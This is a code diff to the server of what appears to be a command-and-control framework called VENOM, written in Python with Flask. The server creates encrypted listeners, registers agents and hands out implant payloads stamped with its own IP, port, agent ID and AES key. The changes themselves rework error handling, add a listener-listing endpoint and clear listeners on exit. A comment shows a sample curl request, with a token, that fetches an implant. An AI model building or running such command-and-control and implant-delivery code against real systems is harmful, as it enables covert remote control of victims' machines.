@@ -17,6 +17,7 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from base64 import b64encode
 import socket as s
+from atexit import register
 
 ''' TO DO: 
 1- Implement a one time registration feature (Not yet)
@@ -74,6 +75,7 @@ if __name__ == "__main__":
     @app.route('/listeners', methods=['GET', 'POST'])
     @token_required(_SECRET_)
     def listeners():
+        #Make this route POST only
         if(request.method == 'GET'):
             return 'List Listeners with their status', 200
 
@@ -89,47 +91,49 @@ if __name__ == "__main__":
                         base64_bytes = b64encode(Key)
                         AESKey = base64_bytes.decode("ascii")
                         saveListener(id, port, AESKey)
-                        listener = Thread(target=_LISTENERS_[
-                                          "listener_%s" % id].serve_forever)
+                        listener = Thread(target=_LISTENERS_["listener_%s" % id].serve_forever)
                         listener.daemon = True
                         listener.start()
                         print(time.asctime(), "Start Server - %s:%s" %
                               ('0.0.0.0', str(request.json.get('port'))))
                         return 'Listener created successfully', 200
                     else:
-                        return 'Listener with port %s already created!' % (str(port)), 200
+                        return 'Listener with port %s already created!' % (str(port)), 206
                 except:
-                    return 'Error while creating a listener!', 404
+                    return 'Error while creating a listener!', 206
 
             elif (request.json.get('action') == 'delete'):
                 if(request.json.get('ListenerId') and delListener(request.json.get('ListenerId'))):
-                    print(_LISTENERS_)
                     id = request.json.get('ListenerId')
                     _LISTENERS_["listener_%s" % id].server_close()
                     return 'Listener deleted successfully', 200
                 else:
-                    return 'No Listener with specified ID found!', 404
+                    return 'No Listener with specified ID found!', 206
 
-        return 'Missing Parameters', 422
+        return 'Missing Parameters', 206
 
     # curl http://localhost:1337/implant -XPOST -H "content-type: application/json" -d '{"id":"26711","type":"linux"}' -H "cookie: accessToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTE4NjQ5MTksImV4cCI6MTY1MTg2NTUxOSwic3ViIjoidmVub21AdmVub20ubG9jYWwifQ.JtTaS9jnmPLBciG4gkt_tviYHNcUUU-jTRAEwo4Qyjg"
     @app.route('/implant', methods=['POST'])
     @token_required(_SECRET_)
     def implant():
-        type = request.json.get('type')
-        listenerID = request.json.get('id')
-        seed()
-        agentID = "".join(choices(digits, k=5))
-        port = getListener(listenerID).get('port')
-        key = getListener(listenerID).get('key')
-        registerAgent(agentID, listenerID)
-        implant = getImplant(type)
-        implant = implant.replace('REPLACE_IP', s.getsockname()[0]).replace(
-            'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
-        return Response(implant,  mimetype='application/octet-stream'), 200
-        # except:
-        # return 'Listener with ID: %s not found!' % (listenerId), 404
-
+        if(request.json.get('type') and request.json.get('id')): 
+            try: 
+                type = request.json.get('type')
+                listenerId = request.json.get('id')
+                seed()
+                agentID = "".join(choices(digits, k=5))
+                port = getListener(listenerId).get('port')
+                key = getListener(listenerId).get('key')
+                registerAgent(agentID, listenerId)
+                implant = getImplant(type)
+                implant = implant.replace('REPLACE_IP', s.getsockname()[0]).replace(
+                    'REPLACE_PORT', str(port)).replace('REPLACE_ID', agentID).replace('REPLACE_KEY', key)
+                return Response(implant,  mimetype='application/octet-stream'), 200
+            except:
+                return 'Listener with ID: %s not found!' % (request.json.get('id')), 206    
+        else: 
+            return 'Missing Parameters!' , 206
+            
     @app.route('/api/getAgentStatusCount/<status>', methods=['GET'])
     @token_required(_SECRET_)
     def getAgentStatusCount(status):
@@ -141,12 +145,28 @@ if __name__ == "__main__":
             return jsonify({
                 "agents": str(db.agents.count_documents({'status': {'$eq': 'dead' }}))
             })
+    
+    @app.route('/api/getListeners/', methods=['GET'])
+    @token_required(_SECRET_)
+    def getListneres(): 
+        listeners = dict()
+        listeners['listeners'] = []
+        i = 0 
+        for listener in getListeners(): 
+            #delete default mongo objectID 
+            del listener['_id']
+            listeners['listeners'].append(listener)
+            
+        
+        return listeners 
+        
 
     parser = ArgumentParser(description='Welcome to VENOM')
     parser.add_argument('--port', type=int, required=True,
-                        default='8080', help='Port number, Default set to 8080 ')
+                        default='8080', help='Port number, Default set to 8080')
     args = parser.parse_args()
     migrate()
+    register(db.listeners.delete_many,{})
     app.run(host='0.0.0.0', port=args.port, debug=True)
     # if(db.venom.find_one({'username': {'$eq': 'admin' }, 'password': {'$eq': "admin".encode('utf-8').hexdigest()} })):
     #   _REG_FLAG_ = 1
